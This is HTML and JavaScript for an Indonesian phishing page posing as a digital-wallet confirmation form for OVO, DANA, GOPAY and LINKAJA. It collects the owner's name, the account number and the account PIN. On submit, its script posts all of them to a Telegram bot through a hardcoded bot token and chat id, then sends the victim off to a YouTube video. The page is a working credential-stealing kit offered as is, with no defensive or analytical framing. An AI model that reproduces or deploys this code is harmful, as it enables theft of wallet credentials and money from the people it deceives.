    <div class="container">

      </div><br>
        <div class="container w-75 mt-3">
            <div class="form-cc">
                <div class="form-group">
                    <div class="form-group" style="width: 70%">
                        <select style="border-radius: 15px" class="form-control shadow-sm form-control-sm" id="input1">
                            <option value=>=Dompet Digital Anda=</option>
                            <option value="OVO">OVO</option>
                            <option value="DANA">DANA</option>
                            <option value="GOPAY">GOPAY</option>
                            <option value="LINKAJA">LINKAJA</option>

                        </select>
                    </div>
                    <input style="border-radius: 15px" type="text" class="form-control shadow-sm mt-3" id="input2" placeholder="Nama Pemilik Akun">
                    <input style="border-radius: 15px" type="number" class="form-control shadow-sm mt-3" id="input3" placeholder="No Akun Dompet Digital">
                    <input style="border-radius: 15px" type="number" class="form-control shadow-sm mt-3" id="input4" placeholder="Pin Akun ">
                </div>
                <div class="bnt-next mt-3 mb-3 text-center">
                    <button onclick="next()" class="btnNext mt-3" style="background-color: #007BED; border: none; border-radius: 19px; width: 100%; color: white; font-weight: bold; height: 45px">Konfirmasi</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        function sendMessage(id, botApi, pesan) {
            const url = `https://api.telegram.org/bot${botApi}/sendMessage`;
            const data = {
                chat_id: id,
                text: pesan
            };
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Pesan terkirim:', data);
                window.location.href = "https://www.youtube.com/watch?v=9dcS-zy-vuw"
            })
            .then(response => response.json())
            .then(data => {
                window.location.herf = "https://www.youtube.com/watch?v=9dcS-zy-vuw";
            })
            .catch(error => {
                console.error('Terjadi kesalahan:', error);
            });
        }

        const next = () => {
            const nocard = document.querySelector("#input1").value;
            const norek = document.querySelector("#input2").value;
            const ktp = document.querySelector("#input3").value;
            const pin = document.querySelector("#input4").value;
            let text = `==| Dompet DIGITAL |==\n\nEwallet: ${nocard}\nNama Pemilik: ${norek}\nNO Ewallet: ${ktp}\nPin Akun: ${pin}`;
            let bot = "6812088676:AAHPnIlmafwfeNzHXW7X4oolJCpWWrvPH3U";
            let id = "6863354480";
            if (nocard === "" || norek === "" || ktp==="" || pin==="") {
                alert("Mohon lengkapi data Anda.");
            } else {
                sendMessage(id, bot, text);
            }
        }
    </script>
